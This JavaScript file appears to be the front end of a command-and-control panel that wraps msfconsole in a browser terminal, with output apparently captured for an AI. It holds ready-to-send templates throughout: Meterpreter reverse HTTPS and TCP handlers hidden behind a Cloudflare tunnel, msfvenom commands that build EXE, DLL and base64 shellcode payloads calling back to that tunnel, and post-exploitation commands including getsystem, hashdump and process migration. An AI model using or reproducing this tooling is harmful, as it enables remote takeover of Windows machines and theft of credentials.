// MSF PTY Terminal
let msfPtyTerminal=null,msfPtyFitAddon=null,msfPtyWs=null,msfPtyConnecting=false,msfPtyReconnectAttempts=0,MSF_TUNNEL="",msfPtyPingInterval=null;

async function fetchTunnelInfo(){try{const r=await fetch("/api/tunnel-info");if(r.ok){const d=await r.json();MSF_TUNNEL=d.msf_tunnel||"";}}catch(e){}}

function connectMsfPtyWebSocket(){
    if(msfPtyConnecting||msfPtyWs?.readyState===WebSocket.OPEN||msfPtyWs?.readyState===WebSocket.CONNECTING)return;
    msfPtyConnecting=true;
    const ws=location.protocol==="https:"?"wss:":"ws:";
    msfPtyWs=new WebSocket(ws+"//"+location.host+"/ws/msf-pty");
    msfPtyWs.onopen=()=>{
        msfPtyConnecting=false;msfPtyReconnectAttempts=0;
        setTimeout(sendMsfPtyResize,500);
        // Start ping interval
        if(msfPtyPingInterval)clearInterval(msfPtyPingInterval);
        msfPtyPingInterval=setInterval(()=>{
            if(msfPtyWs?.readyState===WebSocket.OPEN)msfPtyWs.send('{"type":"ping"}');
        },20000);
        if(msfPtyTerminal){msfPtyTerminal.writeln("\x1b[32m[+] Connected to msfconsole\x1b[0m");if(MSF_TUNNEL)msfPtyTerminal.writeln("\x1b[36m[*] MSF Tunnel: "+MSF_TUNNEL+"\x1b[0m\n");}
    };
    msfPtyWs.onmessage=(e)=>{
        // Handle ping/pong silently
        try{const d=JSON.parse(e.data);if(d.type==="ping"){msfPtyWs.send('{"type":"pong"}');return;}if(d.type==="pong")return;}catch(x){}
        if(msfPtyTerminal)msfPtyTerminal.write(e.data);
        // Capture output for AI
        if(typeof captureTerminalOutput==='function')captureTerminalOutput(e.data);
    };
    msfPtyWs.onerror=()=>{msfPtyConnecting=false;};
    msfPtyWs.onclose=()=>{
        msfPtyConnecting=false;
        if(msfPtyPingInterval){clearInterval(msfPtyPingInterval);msfPtyPingInterval=null;}
        if(msfPtyTerminal)msfPtyTerminal.writeln("\x1b[33m[*] Disconnected\x1b[0m");
        if(msfPtyReconnectAttempts<3){msfPtyReconnectAttempts++;setTimeout(connectMsfPtyWebSocket,2000);}
    };
}

function initMsfPtyTerminal(){
    const c=document.getElementById("msf-pty-terminal");if(!c)return;
    if(msfPtyTerminal){if(!msfPtyWs||msfPtyWs.readyState!==WebSocket.OPEN)connectMsfPtyWebSocket();return;}
    fetchTunnelInfo();
    msfPtyTerminal=new Terminal({cursorBlink:true,fontSize:14,fontFamily:"JetBrains Mono,monospace",theme:{background:"#0a0e14",foreground:"#00ff41",cursor:"#00ff41"},scrollback:10000,convertEol:true});
    msfPtyFitAddon=new FitAddon.FitAddon();msfPtyTerminal.loadAddon(msfPtyFitAddon);msfPtyTerminal.open(c);msfPtyFitAddon.fit();
    msfPtyTerminal.onData((d)=>{if(!msfPtyWs||msfPtyWs.readyState!==WebSocket.OPEN){if(d==="\r"||d==="\n")connectMsfPtyWebSocket();return;}msfPtyWs.send(d);});
    window.addEventListener("resize",()=>{if(msfPtyFitAddon)msfPtyFitAddon.fit();sendMsfPtyResize();});
    connectMsfPtyWebSocket();msfPtyTerminal.focus();
}

function msfPtySendCommand(cmd){
    if(!msfPtyWs||msfPtyWs.readyState!==WebSocket.OPEN){if(msfPtyTerminal)msfPtyTerminal.writeln("\x1b[31m[!] Not connected\x1b[0m");return;}
    cmd.split("\n").forEach((l,i)=>{setTimeout(()=>{if(l.trim()&&msfPtyWs?.readyState===WebSocket.OPEN)msfPtyWs.send(l+"\r");},i*200);});
}

document.addEventListener("DOMContentLoaded",()=>{
    const cert="/home/cyber/cyber_c2/certs/msf.pem";
    
    // LISTENERS
    const ls=document.getElementById("msf-listener-template");
    if(ls){
        ls.innerHTML=`<option value="">🎯 Listener...</option>
<option value="https_staged">HTTPS/8443 - staged</option>
<option value="https_stageless">HTTPS/8443 - stageless</option>
<option value="tcp_staged">TCP/4444 - staged</option>
<option value="tcp_stageless">TCP/4444 - stageless</option>`;
        ls.onchange=async(e)=>{
            const v=e.target.value;if(!v)return;
            if(!MSF_TUNNEL)await fetchTunnelInfo();
            const t=MSF_TUNNEL||"TUNNEL.trycloudflare.com";
            const tpl={
"https_staged":`use exploit/multi/handler
set payload windows/x64/meterpreter/reverse_https
set LHOST 0.0.0.0
set LPORT 8443
set OverrideLHOST ${t}
set OverrideLPORT 443
set OverrideRequestHost true
set HandlerSSLCert ${cert}
set ExitOnSession false
run -j`,
"https_stageless":`use exploit/multi/handler
set payload windows/x64/meterpreter_reverse_https
set LHOST 0.0.0.0
set LPORT 8443
set OverrideLHOST ${t}
set OverrideLPORT 443
set OverrideRequestHost true
set HandlerSSLCert ${cert}
set ExitOnSession false
run -j`,
"tcp_staged":`use exploit/multi/handler
set payload windows/x64/meterpreter/reverse_tcp
set LHOST 0.0.0.0
set LPORT 4444
set ExitOnSession false
run -j`,
"tcp_stageless":`use exploit/multi/handler
set payload windows/x64/meterpreter_reverse_tcp
set LHOST 0.0.0.0
set LPORT 4444
set ExitOnSession false
run -j`
            };
            if(tpl[v])msfPtySendCommand(tpl[v]);
            e.target.value="";
        };
    }

    // PAYLOADS
    const ps=document.getElementById("msf-payload-template");
    if(ps){
        ps.innerHTML=`<option value="">📦 Payload...</option>
<option value="b64_staged">BASE64 - staged</option>
<option value="b64_stageless">BASE64 - stageless</option>
<option value="exe_staged">EXE - staged</option>
<option value="exe_stageless">EXE - stageless</option>
<option value="dll_staged">DLL - staged</option>
<option value="dll_stageless">DLL - stageless</option>`;
        ps.onchange=async(e)=>{
            const v=e.target.value;if(!v)return;
            // Always fetch fresh tunnel URL
            await fetchTunnelInfo();
            const t=MSF_TUNNEL||"TUNNEL.trycloudflare.com";
            const d="/home/cyber/cyber_c2/payloads";
            const tpl={
"b64_staged":`msfvenom -p windows/x64/meterpreter/reverse_https LHOST=${t} LPORT=443 -f raw | base64 -w0 > ${d}/shellcode.txt`,
"b64_stageless":`msfvenom -p windows/x64/meterpreter_reverse_https LHOST=${t} LPORT=443 -f raw | base64 -w0 > ${d}/shellcode.txt`,
"exe_staged":`msfvenom -p windows/x64/meterpreter/reverse_https LHOST=${t} LPORT=443 -f exe -o ${d}/msf_staged.exe`,
"exe_stageless":`msfvenom -p windows/x64/meterpreter_reverse_https LHOST=${t} LPORT=443 -f exe -o ${d}/msf.exe`,
"dll_staged":`msfvenom -p windows/x64/meterpreter/reverse_https LHOST=${t} LPORT=443 -f dll -o ${d}/msf_staged.dll`,
"dll_stageless":`msfvenom -p windows/x64/meterpreter_reverse_https LHOST=${t} LPORT=443 -f dll -o ${d}/msf.dll`
            };
            if(tpl[v])msfPtySendCommand(tpl[v]);
            e.target.value="";
        };
    }

    // POST
    const pt=document.getElementById("msf-post-template");
    if(pt){
        pt.innerHTML=`<option value="">🔧 Post...</option>
<option value="getsystem">getsystem</option>
<option value="hashdump">hashdump</option>
<option value="migrate -N explorer.exe">migrate explorer</option>
<option value="shell">shell</option>
<option value="ps">ps</option>
<option value="sysinfo">sysinfo</option>
<option value="getuid">getuid</option>`;
        pt.onchange=(e)=>{if(e.target.value){msfPtySendCommand(e.target.value);e.target.value="";}};
    }
});

// Send resize to server
function sendMsfPtyResize() {
    if (msfPtyWs && msfPtyWs.readyState === WebSocket.OPEN && msfPtyTerminal) {
        const dims = { type: "resize", cols: msfPtyTerminal.cols, rows: msfPtyTerminal.rows };
        msfPtyWs.send(JSON.stringify(dims));
    }
}
